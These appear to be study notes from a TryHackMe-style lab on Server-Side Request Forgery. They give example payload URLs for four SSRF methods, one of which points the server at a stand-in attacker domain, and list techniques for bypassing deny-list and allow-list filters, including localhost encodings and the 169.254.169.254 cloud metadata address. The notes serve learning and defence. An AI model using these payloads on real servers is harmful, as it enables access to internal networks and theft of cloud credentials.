### Table of contents
- [[#Intro]]
- [[#Methods]]
- [[#Finding an SSRF]]
- [[#Common Defenses]]

___
### Intro
[[#Table of contents|Back to the top]]

**Server-Side Request Forgery**: attacker causes webserver to make additional/edited **HTTP request** to resource chosen by attacker
- **Regular**: data returned to attacker's screen
- **Blind**: no info returned to attacker

$\rightarrow$ Access unauthorized areas
$\rightarrow$ Access customer/organizational data
$\rightarrow$ Scale to internal networks
$\rightarrow$ Reveal authentication tokens/credentials

___
### Methods
[[#Table of contents|Back to the top]]

1. **Complete control** over page requested by server
	- Expected request:
	`http://website.thm/stock?url=http://api.website.thm/api/stock/stock/item?id=123`
	- Target: `http://api.website.thm/api/user`
	- Payload:
	`http://website.thm/stock?url=`**`http://api.website.thm/api/user`**

2. **`../`**: directory traversal
	- Expected request:
	`http://website.thm/stock?url=/item?id=123`
	- Target: `http://website.thm/user`
	- Payload:
	`http://website.thm/stock?url=`**`/../user`**

3. Control of server's **subdomain**
	- Expected request:
	`http://website.thm/stock?server=api&id=123`
	- Target: `http://api.website.thm/api/user`
	- Payload:
	`http://website.thm/stock?server=`**`api.website.thm/api/user&x=&id=123`**

	NB: **`&x=`** stops remaining path from being appended to the end of attacker's URL, instead turns it into parameter

4. Force server to request **server chosen by attacker**
	- Expected request:
	`http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123`
	- Goal: legitimate domain makes request to hacker domain
	- Payload:
	`http://website.thm/stock?url=`**`http://hacker-domain.thm/`**

___
### Finding an SSRF
[[#Table of contents|Back to the top]]

- Full URL used as parameter in address bar
![[Pasted image 20250425101442.png]]

- Hidden field in a form
![[Pasted image 20250425101447.png]]

- Partial URL such as hostname
![[Pasted image 20250425101513.png]]

- URL path
![[Pasted image 20250425101533.png]]

___
### Common Defenses
[[#Table of contents|Back to the top]]

#### Deny List
Everything accepted apart from specified resources in list matching particular pattern
*Points of interest*: restrict access to **localhost**, ***cloud*** environment $\rightarrow$ block access to **`169.254.169.254`** $\rightarrow$ attacker: register subdomain on own domain with DNS record pointing to `169.254.169.254`
*Bypass*: **alternative localhost references** (`0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`, `2130706433`, `017700000001`or subdomains with DNS record resolving to `127.0.0.1` such as `127.0.0.1.nip.io`)
#### Allow List
Everything denied unless on list / match particular pattern
Ex: URL parameter must begin with `https://website.thm`
*Bypass*: create subdomain on attacker's domain (ex: `https://website.thm.attackers-domain.thm`)
#### Open Redirect
Visitor gets automatically redirected to other website
Ex: `https://website.thm/link?url=https://tryhackme.com`
*can be exploited by attacker to redirect to attacker domain*